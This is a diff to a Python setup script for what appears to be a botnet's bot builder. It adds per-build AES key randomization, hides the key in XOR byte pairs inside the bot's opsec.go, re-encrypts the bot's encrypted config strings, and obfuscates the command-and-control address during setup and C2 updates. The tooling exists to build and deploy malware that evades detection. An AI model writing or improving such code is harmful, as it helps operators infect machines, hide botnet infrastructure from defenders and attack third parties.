@@ -172,30 +172,11 @@ def generate_crypt_seed() -> str:
 
 
 def derive_key_py(seed: str) -> bytes:
-    """Python implementation of key derivation (must match Go)"""
+    """Python implementation of key derivation (must match Go charizard()).
+    Reads the AES key from opsec.go dynamically."""
     import hashlib
 
-    # Must match Go's 16 key derivation functions in opsec.go
-    dk = bytes(
-        [
-            0xCC ^ 0xA6,  # mew()
-            0xC3 ^ 0x91,  # mewtwo()
-            0x79 ^ 0xC0,  # celebi()
-            0x4F ^ 0xAA,  # jirachi()
-            0x51 ^ 0x80,  # shaymin()
-            0x75 ^ 0xD1,  # phione()
-            0x4B ^ 0x7C,  # manaphy()
-            0x87 ^ 0x86,  # victini()
-            0xFC ^ 0x7C,  # keldeo()
-            0xD2 ^ 0x54,  # meloetta()
-            0xE9 ^ 0xEC,  # genesect()
-            0x77 ^ 0xF1,  # diancie()
-            0x3B ^ 0x4C,  # hoopa()
-            0x3C ^ 0x9D,  # volcanion()
-            0x6C ^ 0x3C,  # magearna()
-            0x97 ^ 0x33,  # marshadow()
-        ]
-    )
+    dk = garuda_key()
 
     h = hashlib.md5()
     h.update(seed.encode())
@@ -210,27 +191,127 @@ def derive_key_py(seed: str) -> bytes:
     return h.digest()
 
 
+# 16 function names in opsec.go order — used to read/write the AES key
+KEY_FUNC_NAMES = [
+    "mew", "mewtwo", "celebi", "jirachi", "shaymin", "phione",
+    "manaphy", "victini", "keldeo", "meloetta", "genesect",
+    "diancie", "hoopa", "volcanion", "magearna", "marshadow",
+]
+
+
+def read_current_key(opsec_path: str) -> bytes:
+    """Read the current 16-byte AES key from XOR byte pairs in opsec.go.
+    Returns the derived key bytes (A^B for each function)."""
+    with open(opsec_path, "r") as f:
+        content = f.read()
+    key_bytes = []
+    for name in KEY_FUNC_NAMES:
+        pattern = rf'func {name}\(\) byte\s*\{{\s*return byte\(0x([0-9A-Fa-f]+) \^ 0x([0-9A-Fa-f]+)\)'
+        m = re.search(pattern, content)
+        if not m:
+            raise ValueError(f"Could not find XOR pair for {name}() in {opsec_path}")
+        a, b = int(m.group(1), 16), int(m.group(2), 16)
+        key_bytes.append(a ^ b)
+    return bytes(key_bytes)
+
+
 def garuda_key() -> bytes:
     """Return the raw 16-byte AES key used by garuda() in opsec.go.
-    This is the XOR byte array BEFORE any MD5 derivation."""
-    return bytes([
-        0xCC ^ 0xA6,  # mew()
-        0xC3 ^ 0x91,  # mewtwo()
-        0x79 ^ 0xC0,  # celebi()
-        0x4F ^ 0xAA,  # jirachi()
-        0x51 ^ 0x80,  # shaymin()
-        0x75 ^ 0xD1,  # phione()
-        0x4B ^ 0x7C,  # manaphy()
-        0x87 ^ 0x86,  # victini()
-        0xFC ^ 0x7C,  # keldeo()
-        0xD2 ^ 0x54,  # meloetta()
-        0xE9 ^ 0xEC,  # genesect()
-        0x77 ^ 0xF1,  # diancie()
-        0x3B ^ 0x4C,  # hoopa()
-        0x3C ^ 0x9D,  # volcanion()
-        0x6C ^ 0x3C,  # magearna()
-        0x97 ^ 0x33,  # marshadow()
-    ])
+    Reads dynamically from opsec.go XOR byte pairs."""
+    base_path = os.path.dirname(os.path.abspath(__file__))
+    opsec_path = os.path.join(base_path, "bot", "opsec.go")
+    return read_current_key(opsec_path)
+
+
+def generate_random_key():
+    """Generate a random 16-byte AES key and XOR operand pairs that produce it.
+    Returns (key_bytes, [(A1,B1), (A2,B2), ..., (A16,B16)])"""
+    key_bytes = os.urandom(16)
+    pairs = []
+    for k in key_bytes:
+        a = random.randint(0, 255)
+        pairs.append((a, a ^ k))  # a ^ (a^k) = k
+    return key_bytes, pairs
+
+
+def patch_opsec_key(opsec_path: str, pairs: list):
+    """Patch the XOR byte pairs in each of the 16 key functions in opsec.go."""
+    with open(opsec_path, "r") as f:
+        content = f.read()
+    for i, name in enumerate(KEY_FUNC_NAMES):
+        a, b = pairs[i]
+        pattern = rf'(func {name}\(\) byte\s*\{{\s*return byte\()0x[0-9A-Fa-f]+ \^ 0x[0-9A-Fa-f]+(\))'
+        replacement = rf'\g<1>0x{a:02X} ^ 0x{b:02X}\2'
+        content = re.sub(pattern, replacement, content)
+    with open(opsec_path, "w") as f:
+        f.write(content)
+
+
+def patch_crypto_tool_key(crypto_path: str, pairs: list):
+    """Patch the key array in tools/crypto.go with the same XOR pairs."""
+    with open(crypto_path, "r") as f:
+        content = f.read()
+    for i, name in enumerate(KEY_FUNC_NAMES):
+        old_pattern = rf'(0x[0-9A-Fa-f]+ \^ 0x[0-9A-Fa-f]+,\s*// {name}\b)'
+        a, b = pairs[i]
+        # Match the existing line for this key function name
+        new_val = f"0x{a:02X} ^ 0x{b:02X}, // {name}"
+        content = re.sub(old_pattern, new_val, content)
+    with open(crypto_path, "w") as f:
+        f.write(content)
+
+
+def aes_ctr_encrypt_with_key(plaintext_bytes: bytes, key: bytes) -> str:
+    """AES-128-CTR encrypt, returns hex(IV || ciphertext)."""
+    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+    iv = os.urandom(16)
+    cipher = Cipher(algorithms.AES(key), modes.CTR(iv))
+    encryptor = cipher.encryptor()
+    ct = encryptor.update(plaintext_bytes) + encryptor.finalize()
+    return (iv + ct).hex()
+
+
+def aes_ctr_decrypt_with_key(hex_blob: str, key: bytes) -> bytes:
+    """AES-128-CTR decrypt from hex(IV || ciphertext)."""
+    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+    data = bytes.fromhex(hex_blob)
+    if len(data) <= 16:
+        return b""
+    iv = data[:16]
+    ct = data[16:]
+    cipher = Cipher(algorithms.AES(key), modes.CTR(iv))
+    decryptor = cipher.decryptor()
+    return decryptor.update(ct) + decryptor.finalize()
+
+
+def encrypt_config_blobs(config_path: str, old_key: bytes, new_key: bytes):
+    """Re-encrypt all raw hex blobs in config.go from old_key to new_key.
+    1. Read each rawXxx hex blob
+    2. Decrypt with old_key
+    3. Re-encrypt with new_key
+    4. Patch config.go with new hex blobs
+    """
+    with open(config_path, "r") as f:
+        content = f.read()
+
+    # Find all hex blob declarations: var rawXxx, _ = hex.DecodeString("...")
+    pattern = r'(var raw\w+, _ = hex\.DecodeString\(")([0-9a-fA-F]*)("\))'
+
+    def replace_blob(m):
+        prefix = m.group(1)
+        hex_blob = m.group(2)
+        suffix = m.group(3)
+        if not hex_blob:
+            return m.group(0)  # skip empty blobs
+        # Decrypt with old key, re-encrypt with new key
+        plaintext = aes_ctr_decrypt_with_key(hex_blob, old_key)
+        new_blob = aes_ctr_encrypt_with_key(plaintext, new_key)
+        return prefix + new_blob + suffix
+
+    content = re.sub(pattern, replace_blob, content)
+
+    with open(config_path, "w") as f:
+        f.write(content)
 
 
 def aes_ctr_encrypt(plaintext: str) -> str:
@@ -824,8 +905,8 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
     print()
     success(f"C2: {c2_address} | Admin port: {admin_port}")
 
-    # Step 2: Security Tokens
-    print_step(2, 5, "Security Token Generation")
+    # Step 2: Security Tokens & AES Key
+    print_step(2, 5, "Security Token & Key Generation")
 
     magic_code = generate_magic_code(16)
     protocol_version = generate_protocol_version()
@@ -839,7 +920,25 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
     config["protocol_version"] = protocol_version
     config["crypt_seed"] = crypt_seed
 
-    # Obfuscate C2
+    # Generate random per-build AES key BEFORE C2 obfuscation
+    # so derive_key_py and aes_ctr_encrypt use the new key
+    info("Generating per-build AES encryption key...")
+    opsec_path = os.path.join(bot_path, "opsec.go")
+    config_go_path = os.path.join(bot_path, "config.go")
+    crypto_path = os.path.join(base_path, "tools", "crypto.go")
+    old_key = read_current_key(opsec_path)
+    new_key, new_pairs = generate_random_key()
+    # Patch opsec.go first so garuda_key() returns the new key
+    patch_opsec_key(opsec_path, new_pairs)
+    if os.path.exists(crypto_path):
+        patch_crypto_tool_key(crypto_path, new_pairs)
+    success(f"AES key randomized ({new_key.hex()[:16]}...)")
+
+    # Re-encrypt existing blobs (except rawServiceAddr, which gets patched below)
+    encrypt_config_blobs(config_go_path, old_key, new_key)
+    success("Sensitive string blobs re-encrypted")
+
+    # Obfuscate C2 (now uses the NEW key via garuda_key() / derive_key_py())
     info("Applying multi-layer obfuscation...")
     obfuscated_c2 = obfuscate_c2(c2_address, crypt_seed)
     config["obfuscated_c2"] = obfuscated_c2
@@ -1001,7 +1100,29 @@ def run_c2_update(base_path: str, cnc_path: str, bot_path: str):
 
     success(f"New C2: {c2_address}")
 
-    # Obfuscate with existing crypt_seed
+    # Step 2: Update & Build
+    print_step(2, 2, "Update & Build")
+
+    print(f"{Colors.DIM}   Applying new C2 address and fresh AES key...{Colors.RESET}\n")
+
+    # Generate random AES key FIRST so C2 obfuscation uses the new key
+    info("Generating per-build AES encryption key...")
+    opsec_path = os.path.join(bot_path, "opsec.go")
+    config_go_path = os.path.join(bot_path, "config.go")
+    crypto_path = os.path.join(base_path, "tools", "crypto.go")
+    old_key = read_current_key(opsec_path)
+    new_key, new_pairs = generate_random_key()
+    # Patch opsec.go first so garuda_key() returns the new key
+    patch_opsec_key(opsec_path, new_pairs)
+    if os.path.exists(crypto_path):
+        patch_crypto_tool_key(crypto_path, new_pairs)
+    success(f"AES key randomized ({new_key.hex()[:16]}...)")
+
+    # Re-encrypt existing blobs with new key
+    encrypt_config_blobs(config_go_path, old_key, new_key)
+    success("Sensitive string blobs re-encrypted")
+
+    # Obfuscate C2 (now uses the NEW key via garuda_key() / derive_key_py())
     obfuscated_c2 = obfuscate_c2(c2_address, config["crypt_seed"])
     config["obfuscated_c2"] = obfuscated_c2
 
@@ -1011,11 +1132,7 @@ def run_c2_update(base_path: str, cnc_path: str, bot_path: str):
         error("Obfuscation verification failed!")
         sys.exit(1)
 
-    # Step 2: Update & Build
-    print_step(2, 2, "Update & Build")
-
-    print(f"{Colors.DIM}   Applying new C2 address to bot source...{Colors.RESET}\n")
-
+    # Update bot source with new C2 and existing tokens
     if update_bot_main_go(
         bot_path,
         config["magic_code"],
